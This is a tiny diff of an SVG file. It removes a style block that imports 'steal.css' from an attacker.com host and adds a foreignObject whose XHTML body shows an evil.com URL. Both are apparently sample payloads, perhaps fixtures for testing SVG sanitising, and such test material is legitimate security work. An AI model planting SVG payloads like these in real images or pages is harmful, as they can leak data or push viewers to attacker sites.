@@ -1,6 +1,8 @@
 
-<svg xmlns="http://www.w3.org/2000/svg">
-  <style>
-    @import url("https://attacker.com/steal.css");
-  </style>
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="600">
+  <foreignObject width="100%" height="100%">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      https://evil.com
+    </body>
+  </foreignObject>
 </svg>
